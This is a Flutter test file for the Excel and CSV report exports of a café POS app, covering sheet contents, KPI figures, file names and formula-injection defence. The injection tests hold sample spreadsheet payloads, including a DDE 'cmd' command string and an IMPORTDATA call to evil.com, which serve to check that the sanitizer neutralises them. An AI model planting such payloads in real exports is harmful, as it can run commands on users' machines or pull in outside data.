import 'package:flutter_test/flutter_test.dart';
import 'package:excel/excel.dart';
import 'package:coffee_katta_pos/domain/models/daily_analytics.dart';
import 'package:coffee_katta_pos/domain/models/branch_model.dart';
import 'package:coffee_katta_pos/domain/models/bill_model.dart';
import 'package:coffee_katta_pos/services/excel_export_service.dart';
import 'package:coffee_katta_pos/services/csv_export_service.dart';

void main() {
  group('Executive Excel Export Service Tests', () {
    late DailyAnalytics sampleAnalytics;
    late BranchModel sampleBranch;
    late List<BillModel> sampleBills;

    setUp(() {
      sampleAnalytics = const DailyAnalytics(
        totalSales: 4500.0,
        totalBills: 18,
        totalDiscount: 350.0,
        extraCharges: 80.0,
        paymentStats: {
          'upi': 2800.0,
          'cash': 1400.0,
          'card': 300.0,
        },
        categoryStats: {
          'Cold Coffee & Beverages': 2400.0,
          'Snacks & Sandwiches': 1500.0,
          'Desserts & Waffles': 600.0,
        },
        itemStats: {
          'Special Cold Coffee': ItemStat(name: 'Special Cold Coffee', qty: 25, revenue: 2000.0),
          'Veg Grilled Sandwich': ItemStat(name: 'Veg Grilled Sandwich', qty: 12, revenue: 1080.0),
          'Chocolate Waffle': ItemStat(name: 'Chocolate Waffle', qty: 6, revenue: 600.0),
        },
        hourlyStats: {
          '10': HourStat(sales: 1200.0, orders: 5),
          '14': HourStat(sales: 800.0, orders: 4),
          '17': HourStat(sales: 2500.0, orders: 9),
        },
        userStats: {
          'John Cashier': 3000.0,
          'Alice Terminal': 1500.0,
        },
      );

      sampleBranch = BranchModel(
        branchId: 'latur_main',
        branchName: 'Coffee Katta',
        location: 'Latur Main Branch',
        address: 'Opposite Old Bus Stand, Latur, Maharashtra',
        phone: '+91 9876543210',
      );

      sampleBills = [
        BillModel(
          billId: 'CK-2026-001',
          orderId: 'ORD-101',
          tableId: 'T1',
          tableName: 'Table 1',
          userName: 'John Cashier',
          items: const [
            BillItem(name: 'Special Cold Coffee', category: 'Beverages', qty: 2, price: 80.0),
          ],
          subtotal: 160.0,
          discountAmount: 10.0,
          extraCharges: 5.0,
          total: 155.0,
          payments: const [
            Payment(mode: 'upi', amount: 155.0),
          ],
          createdBy: 'STAFF-1',
          createdAt: DateTime(2026, 9, 14, 10, 30),
        ),
        BillModel(
          billId: 'CK-2026-002',
          orderId: 'ORD-102',
          tableId: 'T2',
          tableName: 'Table 2',
          userName: 'Alice Terminal',
          items: const [
            BillItem(name: 'Veg Grilled Sandwich', category: 'Snacks', qty: 1, price: 90.0),
          ],
          subtotal: 90.0,
          discountAmount: 0.0,
          extraCharges: 0.0,
          total: 90.0,
          payments: const [
            Payment(mode: 'cash', amount: 90.0),
          ],
          createdBy: 'STAFF-2',
          createdAt: DateTime(2026, 9, 14, 14, 15),
        ),
      ];
    });

    test('Generates valid non-empty Excel .xlsx bytes', () {
      final bytes = ExcelExportService.generateExecutiveWorkbook(
        analytics: sampleAnalytics,
        branch: sampleBranch,
        dateRangeStr: '14 Sep 2026',
        bills: sampleBills,
      );

      expect(bytes, isNotNull);
      expect(bytes.length, greaterThan(2000));
    });

    test('Decodes generated workbook and verifies all 5 required business sheets exist', () {
      final bytes = ExcelExportService.generateExecutiveWorkbook(
        analytics: sampleAnalytics,
        branch: sampleBranch,
        dateRangeStr: '14 Sep 2026',
        bills: sampleBills,
      );

      final excel = Excel.decodeBytes(bytes);
      expect(excel.tables.keys, contains('Executive Overview'));
      expect(excel.tables.keys, contains('Category Sales'));
      expect(excel.tables.keys, contains('Top Menu Items'));
      expect(excel.tables.keys, contains('Hourly Velocity'));
      expect(excel.tables.keys, contains('Invoices Register'));
    });

    test('Executive Overview sheet contains accurate financial KPI metrics', () {
      final bytes = ExcelExportService.generateExecutiveWorkbook(
        analytics: sampleAnalytics,
        branch: sampleBranch,
        dateRangeStr: '14 Sep 2026',
        bills: sampleBills,
      );

      final excel = Excel.decodeBytes(bytes);
      final sheet = excel['Executive Overview'];

      // Check title row
      final titleCell = sheet.cell(CellIndex.indexByColumnRow(columnIndex: 0, rowIndex: 0));
      expect(titleCell.value.toString(), contains('COFFEE KATTA'));

      // Check branch subtitle
      final branchCell = sheet.cell(CellIndex.indexByColumnRow(columnIndex: 0, rowIndex: 1));
      expect(branchCell.value.toString(), contains('Latur Main'));

      // Financial accuracy assertions
      expect(sampleAnalytics.grossSales, equals(4500.0 + 350.0 - 80.0)); // 4770.0
      expect(sampleAnalytics.netSales, equals(4770.0 - 350.0));          // 4420.0
      expect(sampleAnalytics.netRevenue, equals(4500.0));
      expect(sampleAnalytics.aov, equals(250.0));                         // 4500 / 18
    });

    test('Category Sales and Top Menu Items sheets populate rankings correctly', () {
      final bytes = ExcelExportService.generateExecutiveWorkbook(
        analytics: sampleAnalytics,
        branch: sampleBranch,
        dateRangeStr: '14 Sep 2026',
        bills: sampleBills,
      );

      final excel = Excel.decodeBytes(bytes);
      
      // Category Sheet
      final catSheet = excel['Category Sales'];
      expect(catSheet.maxRows, greaterThan(3));

      // Menu Items Sheet
      final itemSheet = excel['Top Menu Items'];
      expect(itemSheet.maxRows, greaterThan(3));
    });

    test('Invoices Register sheet populates individual bill line items', () {
      final bytes = ExcelExportService.generateExecutiveWorkbook(
        analytics: sampleAnalytics,
        branch: sampleBranch,
        dateRangeStr: '14 Sep 2026',
        bills: sampleBills,
      );

      final excel = Excel.decodeBytes(bytes);
      final billsSheet = excel['Invoices Register'];

      // Check header and 2 bill rows + total row
      expect(billsSheet.maxRows, greaterThanOrEqualTo(5));
    });

    test('formatReportFileName produces clean, branded business filenames and avoids Flutter default', () {
      final filename1 = ExcelExportService.formatReportFileName(
        branch: sampleBranch,
        dateRangeStr: '14 Sep 2026',
      );
      expect(filename1, equals('CoffeeKatta_Executive_Report_14_Sep_2026.xlsx'));
      expect(filename1, isNot(contains('Flutter')));

      final filename2 = ExcelExportService.formatReportFileName(
        branch: const BranchModel(branchId: 'b2', branchName: 'Latur Main', location: 'City'),
        dateRangeStr: '01 Sep 2026 - 14 Sep 2026',
      );
      expect(filename2, equals('CoffeeKatta_Latur_Main_Executive_Report_01_Sep_2026_to_14_Sep_2026.xlsx'));

      final filename3 = ExcelExportService.formatReportFileName(
        branch: const BranchModel(branchId: 'b3', branchName: 'Coffee Katta - FC Road', location: 'Pune'),
        dateRangeStr: 'Today',
      );
      expect(filename3, equals('CoffeeKatta_FC_Road_Executive_Report_Today.xlsx'));
    });

    test('generateExecutiveWorkbook accepts custom fileName without falling back to FlutterExcel.xlsx', () {
      const customName = 'CoffeeKatta_Custom_Audit.xlsx';
      final bytes = ExcelExportService.generateExecutiveWorkbook(
        analytics: sampleAnalytics,
        branch: sampleBranch,
        dateRangeStr: '14 Sep 2026',
        bills: sampleBills,
        fileName: customName,
      );

      expect(bytes, isNotEmpty);
      final excel = Excel.decodeBytes(bytes);
      expect(excel.tables.keys, contains('Executive Overview'));
    });

    test('ExcelExportService.sanitizeCellValue neutralizes formula/macro/DDE injection prefixes', () {
      expect(ExcelExportService.sanitizeCellValue("=cmd|' /C calc'!A0"), equals("'=cmd|' /C calc'!A0"));
      expect(ExcelExportService.sanitizeCellValue('@SUM(A1:A10)'), equals("'@SUM(A1:A10)"));
      expect(ExcelExportService.sanitizeCellValue('+123456789'), equals("'+123456789"));
      expect(ExcelExportService.sanitizeCellValue('-2+5*10'), equals("'-2+5*10"));
      expect(ExcelExportService.sanitizeCellValue('\t=1+1'), equals("'\t=1+1"));
      expect(ExcelExportService.sanitizeCellValue('   =SUM(B1:B2)'), equals("'   =SUM(B1:B2)"));

      // Normal strings must not be prepended with a quote
      expect(ExcelExportService.sanitizeCellValue('Special Cold Coffee'), equals('Special Cold Coffee'));
      expect(ExcelExportService.sanitizeCellValue('Latur Main Branch'), equals('Latur Main Branch'));

      // Numbers must remain clean numbers
      expect(ExcelExportService.sanitizeCellValue(150.0), equals('150.0'));
      expect(ExcelExportService.sanitizeCellValue(42), equals('42'));
      expect(ExcelExportService.sanitizeCellValue(null), equals(''));
    });

    test('generateExecutiveWorkbook sanitizes malicious bill names in Invoices Register sheet', () {
      final maliciousBills = [
        BillModel(
          billId: 'CK-MAL-001',
          orderId: 'ORD-MAL-01',
          tableId: 'T1',
          tableName: '=cmd|calc',
          userName: '@malicious_cashier',
          items: const [
            BillItem(name: '+10 Free Shake', category: 'Beverages', qty: 1, price: 50.0),
          ],
          subtotal: 50.0,
          discountAmount: 0.0,
          extraCharges: 0.0,
          total: 50.0,
          payments: const [Payment(mode: 'cash', amount: 50.0)],
          createdBy: '-hacker',
          createdAt: DateTime(2026, 9, 14, 12, 0),
        ),
      ];

      final bytes = ExcelExportService.generateExecutiveWorkbook(
        analytics: sampleAnalytics,
        branch: sampleBranch,
        dateRangeStr: '14 Sep 2026',
        bills: maliciousBills,
      );

      final excel = Excel.decodeBytes(bytes);
      final sheet = excel.tables['Invoices Register']!;

      // Locate row containing CK-MAL-001
      final row = sheet.rows.firstWhere(
        (r) => r.any((cell) => cell?.value?.toString() == 'CK-MAL-001'),
      );

      // Verify Table Name and Cashier are safely neutralized with leading quote
      final cellValues = row.map((c) => c?.value?.toString() ?? '').toList();
      expect(cellValues, contains("'=cmd|calc"));
      expect(cellValues, contains("'@malicious_cashier"));
    });
  });

  group('CSV Export Formula Injection Defense Tests', () {
    test('CsvExportService.sanitizeCsvField and escapeCsv neutralize formula injection', () {
      expect(CsvExportService.sanitizeCsvField("=cmd|' /C calc'!A0"), equals("'=cmd|' /C calc'!A0"));
      expect(CsvExportService.sanitizeCsvField('@IMPORTDATA("http://evil.com")'), equals("'@IMPORTDATA(\"http://evil.com\")"));
      expect(CsvExportService.sanitizeCsvField('+447123456789'), equals("'+447123456789"));
      expect(CsvExportService.sanitizeCsvField('-1+1'), equals("'-1+1"));
      expect(CsvExportService.sanitizeCsvField('\t=alert(1)'), equals("'\t=alert(1)"));

      // Normal text remains unmodified
      expect(CsvExportService.sanitizeCsvField('Veg Cheese Sandwich'), equals('Veg Cheese Sandwich'));
      expect(CsvExportService.sanitizeCsvField(250.0), equals('250.0'));
      expect(CsvExportService.sanitizeCsvField(null), equals(''));

      // escapeCsv wraps with quotes and neutralizes
      expect(CsvExportService.escapeCsv('=1+1'), equals("'=1+1"));
      expect(CsvExportService.escapeCsv('=SUM(1, 2)'), equals('"\'=SUM(1, 2)"'));
      expect(CsvExportService.escapeCsv('Normal, with comma'), equals('"Normal, with comma"'));
    });

    test('generateBillsRegisterCsv neutralizes formula injection on customer and table names', () {
      final maliciousBills = [
        BillModel(
          billId: 'CK-CSV-001',
          orderId: 'ORD-CSV-01',
          tableId: 'T1',
          tableName: '=cmd|calc',
          userName: '@cashier_exploit',
          items: const [
            BillItem(name: '+Promo Coffee', category: 'Beverages', qty: 1, price: 90.0),
          ],
          subtotal: 90.0,
          discountAmount: 0.0,
          extraCharges: 0.0,
          total: 90.0,
          payments: const [Payment(mode: 'cash', amount: 90.0)],
          createdBy: '-actor',
          createdAt: DateTime(2026, 9, 14, 12, 0),
        ),
      ];

      final branch = const BranchModel(
        branchId: 'b1',
        branchName: 'Main Branch',
        location: 'City',
      );

      final csv = CsvExportService.generateBillsRegisterCsv(
        bills: maliciousBills,
        branch: branch,
        dateRangeStr: '14 Sep 2026',
      );

      expect(csv, contains("CK-CSV-001"));
      expect(csv, contains("'=cmd|calc")); // Neutralized table name
      expect(csv, contains("'@cashier_exploit")); // Neutralized user name
    });
  });
}
